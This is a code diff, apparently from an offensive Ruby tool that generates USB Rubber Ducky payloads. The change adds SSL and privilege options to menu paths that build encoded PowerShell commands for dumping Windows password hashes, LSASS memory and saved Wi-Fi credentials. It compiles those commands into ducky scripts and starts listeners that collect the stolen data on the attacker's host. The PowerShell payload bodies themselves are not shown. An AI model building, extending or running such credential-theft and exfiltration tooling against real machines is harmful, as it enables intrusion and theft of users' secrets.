@@ -14,23 +14,32 @@ def server(attack)
   host = @server_setup.get_host
   if attack == 'hash_dump'
     port = @server_setup.get_port
-    powershell_command = powershell_hash_dump(host,port)
+    if @ssl
+      powershell_command = powershell_hash_dump(host,port,@ssl)
+    else
+      powershell_command = powershell_hash_dump(host,port)
+    end
     return host,port,powershell_command
   elsif attack == 'lsass_dump'
     port = @server_setup.get_port
-    powershell_command1,powershell_command2 = powershell_lsass_dump(host,port,random_name_gen)
+    if @ssl
+      powershell_command1,powershell_command2 = powershell_lsass_dump(host,port,random_name_gen,@ssl)
+    else
+      powershell_command1,powershell_command2 = powershell_lsass_dump(host,port,random_name_gen)
+    end
     return host,port,powershell_command1,powershell_command2
   elsif attack == 'wifi_dump'
     port = @server_setup.get_port
-    random_name_answer = [(get_input('Would you like to randomize the folder name?[yes/no] ') ), $stdin.gets.rstrip][1]
-    if random_name_answer == 'yes'
-      print_info("Creating Random Name!\n")
-      random_name = random_name_gen
-      powershell_command = powershell_wifi_dump(host,port,random_name)
+    if @ssl and @priv
+      powershell_command = powershell_wifi_dump(host,port,@priv,@ssl)
+    elsif @ssl
+      powershell_command = powershell_wifi_dump(host,port,nil,@ssl)
+    elsif @priv
+      powershell_command = powershell_wifi_dump(host,port,@priv)
     else
       powershell_command = powershell_wifi_dump(host,port)
     end
-    return port,powershell_command
+    return host,port,powershell_command
   elsif attack == 'wget'
     file_path = [(get_input('Enter full path to executable: ') ), $stdin.gets.rstrip][1]
     file_name = file_path.split('/')[-1]
@@ -77,17 +86,29 @@ def start_msf(host,port)
   msf = Readline.readline("#{get_input('Would you like to start the Metasploit Listener[yes/no]')} ", true)
   msf == 'yes' ? metasploit_setup(host,port) : print_info("Goody Bye!\n")
 end
-def start_hash_server(port)
+def start_hash_server(port,host=nil)
   hash = Readline.readline("#{get_input('Would you like to start the listener[yes/no]')} ", true)
-  hash == 'yes' ? @server_setup.hash_server(port) : print_info("Goody Bye!\n")
+  if @ssl
+    hash == 'yes' ? @server_setup.hash_server(port,@ssl,host) : print_info("Goody Bye!\n")
+  else
+    hash == 'yes' ? @server_setup.hash_server(port) : print_info("Goody Bye!\n")
+  end
 end
-def start_lsass_server(port)
+def start_lsass_server(port,host=nil)
   lsass = Readline.readline("#{get_input('Would you like to start the listener[yes/no]')} ", true)
-  lsass == 'yes' ? @server_setup.lsass_server(port) : print_info("Goody Bye!\n")
+  if @ssl
+    lsass == 'yes' ? @server_setup.hash_server(port,@ssl,host) : print_info("Goody Bye!\n")
+  else
+    lsass == 'yes' ? @server_setup.hash_server(port) : print_info("Goody Bye!\n")
+  end
 end
-def start_wifi_server(port)
+def start_wifi_server(port,host=nil)
   wifi = Readline.readline("#{get_input('Would you like to start the listener[yes/no]')} ", true)
-  wifi == 'yes' ? @server_setup.wifi_server(port) : print_info("Goody Bye!\n")
+  if @ssl
+    wifi == 'yes' ? @server_setup.wifi_server(port,@ssl,host) : print_info("Goody Bye!\n")
+  else
+    wifi == 'yes' ? @server_setup.wifi_server(port) : print_info("Goody Bye!\n")
+  end
 end
 def case_main_menu
   answer = main_menu
@@ -102,8 +123,8 @@ def case_main_menu
       case_dump_wifi_menu
     when '5'
       case_wget_menu
-    when '6'
-      case_hex_to_bin_menu
+    #when '6'
+    #  case_hex_to_bin_menu
     when '99'
       exit
     else
@@ -146,12 +167,26 @@ def case_dump_hashes_menu
   dump_hashes_answer = dump_hashes_menu
   case dump_hashes_answer
     when '1'
+      @ssl = true
+      host,port,powershell_command = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_hash_dump_uac(encode_command(powershell_command))
+      compile_ducky(hash_dump_file)
+      start_hash_server(port,host)
+    when '2'
+      @ssl = true
+      host,port,powershell_command = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_hash_dump_no_uac(encode_command(powershell_command))
+      compile_ducky(hash_dump_file)
+      start_hash_server(port,host)
+  when '3'
       host,port,powershell_command = server(attack)
       print_info("Creating Text File!\n")
       ducky_hash_dump_uac(encode_command(powershell_command))
       compile_ducky(hash_dump_file)
       start_hash_server(port)
-    when '2'
+    when '4'
       host,port,powershell_command = server(attack)
       print_info("Creating Text File!\n")
       ducky_hash_dump_no_uac(encode_command(powershell_command))
@@ -170,12 +205,26 @@ def case_dump_lsass_menu
   dump_lsass_answer = dump_lsass_menu
   case dump_lsass_answer
     when '1'
+      @ssl = true
+      host,port,powershell_command1,powershell_command2 = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_lsass_uac(encode_command(powershell_command1),encode_command(powershell_command2))
+      compile_ducky(lsass_dump_file)
+      start_lsass_server(port,host)
+    when '2'
+      @ssl = true
+      host,port,powershell_command1,powershell_command2 = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_lsass_no_uac(encode_command(powershell_command1),encode_command(powershell_command2))
+      compile_ducky(lsass_dump_file)
+      start_lsass_server(port,host)
+    when '3'
       host,port,powershell_command1,powershell_command2 = server(attack)
       print_info("Creating Text File!\n")
       ducky_lsass_uac(encode_command(powershell_command1),encode_command(powershell_command2))
       compile_ducky(lsass_dump_file)
       start_lsass_server(port)
-    when '2'
+    when '4'
       host,port,powershell_command1,powershell_command2 = server(attack)
       print_info("Creating Text File!\n")
       ducky_lsass_no_uac(encode_command(powershell_command1),encode_command(powershell_command2))
@@ -194,13 +243,44 @@ def case_dump_wifi_menu
   dump_wifi_answer = dump_wifi_menu
   case dump_wifi_answer
     when '1'
-      port,powershell_command = server(attack)
+      @ssl = true
+      @priv = true
+      host,port,powershell_command = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_wifi_uac(encode_command(powershell_command))
+      compile_ducky(wifi_dump_file)
+      start_wifi_server(port,host)
+    when '2'
+      @ssl = true
+      @priv = true
+      host,port,powershell_command = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_wifi_no_uac(encode_command(powershell_command))
+      compile_ducky(wifi_dump_file)
+      start_wifi_server(port,host)
+    when '3'
+      @ssl = true
+      host,port,powershell_command = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_wifi_no_uac(encode_command(powershell_command))
+      compile_ducky(wifi_dump_file)
+      start_wifi_server(port,host)
+    when '4'
+      @priv = true
+      host,port,powershell_command = server(attack)
       print_info("Creating Text File!\n")
       ducky_wifi_uac(encode_command(powershell_command))
       compile_ducky(wifi_dump_file)
       start_wifi_server(port)
-    when '2'
-      port,powershell_command = server(attack)
+    when '5'
+      @priv = true
+      host,port,powershell_command = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_wifi_no_uac(encode_command(powershell_command))
+      compile_ducky(wifi_dump_file)
+      start_wifi_server(port)
+    when '6'
+      host,port,powershell_command = server(attack)
       print_info("Creating Text File!\n")
       ducky_wifi_no_uac(encode_command(powershell_command))
       compile_ducky(wifi_dump_file)
@@ -268,9 +348,5 @@ def case_hex_to_bin_menu
   end
 end
 begin
-  if Process.uid != 0
-    print_info('Not Running as Root some payloads may not work properly')
-    sleep(2)
-  end
     case_main_menu
 end
